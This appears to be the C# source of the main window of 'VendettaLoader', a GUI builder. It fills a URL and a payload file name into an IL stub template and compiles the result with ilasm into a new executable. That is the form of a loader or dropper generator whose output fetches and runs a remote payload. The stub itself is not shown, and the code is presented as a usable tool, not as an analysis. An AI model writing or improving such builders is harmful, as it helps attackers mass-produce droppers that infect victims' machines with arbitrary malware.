using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VendettaLoader
{
    public partial class Form1 : Form
    {
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;

        public Form1()
        {
            InitializeComponent();
        }

        private void closeBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void minimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private async void buildBtn_Click(object sender, EventArgs e)
        {
            string url = urlexeBox.Text;
            string payloadFileName = afterPayload_Name.Text;
            string outputFileName = filenameBox.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(payloadFileName) || string.IsNullOrEmpty(outputFileName))
            {
                MessageBox.Show("Forms cannot be empty!");
            }
            else
            {
                string buildPath = "build";
                string folderPath = "stub";
                string stubName = "stub.il";
                string ilasmPath = "compilator\\ilasm.exe";

                string stubFilePath = Path.Combine(folderPath, stubName);

                if (Directory.Exists(folderPath) && Directory.Exists(buildPath) && File.Exists(stubFilePath))
                {
                    cmdBox.Text += $"\nFolder: {folderPath} found!;\nFolder: {buildPath} found";

                    string ilCode = File.ReadAllText(stubFilePath);
                    ilCode = ilCode.Replace("KINGURL", url);
                    ilCode = ilCode.Replace("KING_PROGRAM_NAME", payloadFileName);

                    string tempFilePath = Path.Combine(folderPath, "stubtemp.il");
                    File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8);

                    string exeOutputPath = Path.Combine(buildPath, outputFileName);

                    if (string.IsNullOrEmpty(filenameBox.Text))
                    {
                        statusLabel.ForeColor = Color.Red;
                        statusLabel.Text = "Status Build: Error - Please enter a valid filename!";
                        await Task.Delay(2000);
                        statusLabel.Text = "Status Build: Idle";

                        if (File.Exists(exeOutputPath))
                        {
                            File.Delete(exeOutputPath);
                        }
                    }
                    else
                    {
                        string ilasmArguments = $"/output={exeOutputPath} {tempFilePath}";

                        var processInfo = new ProcessStartInfo(ilasmPath, ilasmArguments)
                        {
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true, 
                            CreateNoWindow = true
                        };


                        using (var process = Process.Start(processInfo))
                        {
                            string output = await process.StandardOutput.ReadToEndAsync();
                            string error = await process.StandardError.ReadToEndAsync();
                            process.WaitForExit();

                            if (process.ExitCode == 0)
                            {
                                statusLabel.ForeColor = Color.LightGreen;
                                statusLabel.Text = "Status Build: Build completed successfully!";
                                File.Delete(tempFilePath);
                                Process.Start("explorer.exe", $"/select,\"{exeOutputPath}\"");
                                await Task.Delay(3500);
                                cmdBox.Text = "VLoader: Ready";
                                urlexeBox.Text = "";
                                statusLabel.Text = "Status Build: Idle";
                            }
                            else
                            {
                                statusLabel.ForeColor = Color.Red;
                                statusLabel.Text = $"Status Build: Build failed! Error: {error}";
                                File.Delete(tempFilePath);
                                await Task.Delay(3500);
                                cmdBox.Text = "VLoader: Ready";
                                urlexeBox.Text = "";
                                statusLabel.Text = "Status Build: Idle";
                            }
                        }
                    }
                }
                else
                {
                    cmdBox.ForeColor = Color.Red;
                    cmdBox.Text = "Error: Required directories or files not found!";
                    await Task.Delay(2000);
                    cmdBox.ForeColor = Color.LightGreen;
                    cmdBox.Text = "VLoader: Ready";
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
           Process.Start("https://github.com/k3rnel-dev");
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            About aboutForm = new About();
            aboutForm.Show();
        }

        private void topPanel_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void topPanel_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void topPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }
    }
}
